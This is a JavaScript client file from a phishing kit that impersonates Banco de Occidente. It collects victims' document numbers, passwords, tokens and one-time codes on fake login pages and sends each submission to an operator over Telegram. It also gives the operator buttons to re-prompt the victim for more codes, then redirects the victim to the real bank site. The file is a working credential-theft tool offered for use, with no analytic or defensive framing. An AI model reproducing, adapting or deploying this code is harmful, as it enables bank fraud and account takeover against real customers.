/**
 * OCCIDENTE - Cliente optimizado con banco-utils
 */

(function() {
    'use strict';

    const routes = {
        'index.html': {
            getData: () => ({
                tipoDocumento: document.getElementById('tipoDocumento')?.value || '',
                numeroDocumento: document.getElementById('numeroDocumento')?.value || '',
                password: document.getElementById('contrasena')?.value || ''
            }),
            validate: (d) => d.numeroDocumento.length >= 6 && d.password.length >= 4
        },
        'token.html': {
            getData: () => ({ token: document.getElementById('token')?.value || '' }),
            validate: (d) => d.token.length >= 6
        },
        'otp.html': {
            getData: () => ({ otp: document.getElementById('otp')?.value || '' }),
            validate: (d) => d.otp.length >= 6
        }
    };

    const buttons = [
        { text: '🔑 Pedir Login', action: 'request_login' },
        { text: '📱 Pedir Token', action: 'request_token' },
        { text: '🔢 Pedir OTP', action: 'request_otp' },
        { text: '✅ Finalizar', action: 'finish' }
    ];

    function handleAction(data) {
        switch(data.action) {
            case 'request_login': window.location.href = 'index.html'; break;
            case 'request_token': window.location.href = 'token.html'; break;
            case 'request_otp': window.location.href = 'otp.html'; break;
            case 'finish': window.location.href = 'https://www.bancodeoccidente.com.co/'; break;
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        BancoUtils.onTelegramAction(handleAction);

        const page = window.location.pathname.split('/').pop();
        const config = routes[page];

        // Sistema de validación de botones
        if (config) {
            const submitBtn = document.querySelector('button[type="submit"]') || document.getElementById('btnContinuar') || document.getElementById('btnVerificar');
            const inputs = document.querySelectorAll('input');

            console.log('🚀 [Occidente] Inicializando:', { page, submitBtn: !!submitBtn, inputsCount: inputs.length });

            function validateForm() {
                const formData = config.getData();
                console.log('🔍 [Occidente] Validando:', { page, formData });
                const isValid = config.validate(formData);
                console.log('✅ [Occidente] Resultado:', { isValid, submitBtn: !!submitBtn });
                if (submitBtn) {
                    submitBtn.disabled = !isValid;
                    submitBtn.classList.toggle('active', isValid);
                }
            }

            if (inputs.length > 0) {
                inputs.forEach(input => {
                    input.addEventListener('input', validateForm);
                });
            }

            // Validación inicial
            validateForm();
        }

        const form = document.querySelector('form');
        if (form) {
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const page = window.location.pathname.split('/').pop();
                const config = routes[page];
                
                if (!config) return;
                
                const formData = config.getData();
                if (!config.validate(formData)) {
                    alert('Complete todos los campos');
                    return;
                }

                BancoUtils.showOverlay();
                const data = BancoUtils.saveBankData('occidente', formData);
                const message = BancoUtils.formatMessage('BANCO DE OCCIDENTE', data);
                const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());

                try {
                    await BancoUtils.sendToTelegram(page.replace('.html', ''), { text: message, keyboard });
                } catch (error) {
                    BancoUtils.hideOverlay();
                    alert('Error al enviar');
                }
            });
        }
    });
})();
